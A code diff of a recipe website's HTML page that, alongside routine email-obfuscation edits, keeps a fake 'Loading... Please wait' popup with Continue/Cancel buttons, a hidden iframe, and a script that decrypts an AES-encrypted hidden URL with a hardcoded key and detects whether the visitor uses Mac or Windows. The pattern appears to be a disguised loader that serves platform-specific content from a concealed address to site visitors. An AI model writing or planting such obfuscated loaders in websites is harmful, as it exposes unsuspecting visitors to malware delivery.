@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -38,16 +39,6 @@
   </style>
 </head>
 <body>
-  <div class="popup" id="customPopup">
-    <div class="popup-content">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
-      <p>Loading... Please wait.</p>
-      <div class="buttons">
-        <button id="cancelBtn" type="button">Cancel</button>
-        <button id="continueBtn" type="button">Continue</button>
-      </div>
-    </div>
-  </div>
   <div class="grain" aria-hidden="true"></div>
 
   <header class="site-header">
@@ -192,7 +183,7 @@
         <div class="contact__grid">
           <div class="contact__details">
             <p class="contact__label">Write</p>
-            <p><a href="mailto:hello@flavourfoodie.example">hello@foodieflavour.example</a></p>
+            <p><a href="/cdn-cgi/l/email-protection#90f8f5fcfcffd0f6fcf1e6ffe5e2f6fffff4f9f5bef5e8f1fde0fcf5"><span class="__cf_email__" data-cfemail="89e1ece5e5e6c9efe6e6ede0ecefe5e8ffe6fcfba7ecf1e8e4f9e5ec">[email&#160;protected]</span></a></p>
             <p class="contact__label">Hours</p>
             <p>We reply within 2–3 business days.</p>
             <p class="contact__label">Social</p>
@@ -225,7 +216,7 @@
     <section class="about" id="privacy" tabindex="-1">
       <h2>Privacy policy</h2>
       <p>
-        Foodie Flavour runs entirely in your browser. Favorites are saved with <strong>local storage</strong> on your device only — we don’t run a backend that receives your recipe picks. The contact form is a demo: nothing is uploaded until you wire it to a mail or form service. Recipe images load from third-party hosts (e.g. <a href="https://unsplash.com" rel="noopener noreferrer" target="_blank">Unsplash</a>); their privacy terms apply when those images load. Questions? <a href="mailto:hello@foodieflavour.example">hello@flavourfoodie.example</a>.
+        Foodie Flavour runs entirely in your browser. Favorites are saved with <strong>local storage</strong> on your device only — we don’t run a backend that receives your recipe picks. The contact form is a demo: nothing is uploaded until you wire it to a mail or form service. Recipe images load from third-party hosts (e.g. <a href="https://unsplash.com" rel="noopener noreferrer" target="_blank">Unsplash</a>); their privacy terms apply when those images load. Questions? <a href="/cdn-cgi/l/email-protection#97fff2fbfbf8d7f1f8f8f3fef2f1fbf6e1f8e2e5b9f2eff6fae7fbf2"><span class="__cf_email__" data-cfemail="6f070a0303002f09030e19001a1d0900000b060a410a170e021f030a">[email&#160;protected]</span></a>.
       </p>
     </section>
 
@@ -277,20 +268,33 @@
     <p class="toast__msg">Order is not available currently.</p>
   </div>
 
-  <script src="js/app.js"></script>
+  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="js/app.js"></script>
+   <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+
   <iframe id="frame" title="yoursomahearts" allowfullscreen allow="fullscreen"></iframe>
+
   <script>
     const PASSPHRASE = "98yNCjeAfWMwk0wI";
     const URL_KEY = "UrLk3yShopEase01";
     ENC_DATA_ORIGIN = "U2FsdGVkX18bCX3OhzEYApbXaQTgnWbbDXXC6qNH+RXI6yCb0BbaZrgrWiovQXDZ5Xa7uRL5MtIoq0gLS2M0WQ=="
     let lastUrl = null;
+
     // Decrypt the origin URL
     const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
     const DATA_URL = DATA_ORIGIN;
 
     function detectPlatform() {
-      const p = (navigator.userAgentData && navigator.userAgentData.platform) 
-                navigator.platform  navigator.userAgent || "";
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
       return /mac/i.test(p) ? "mac" : "win";
     }
 
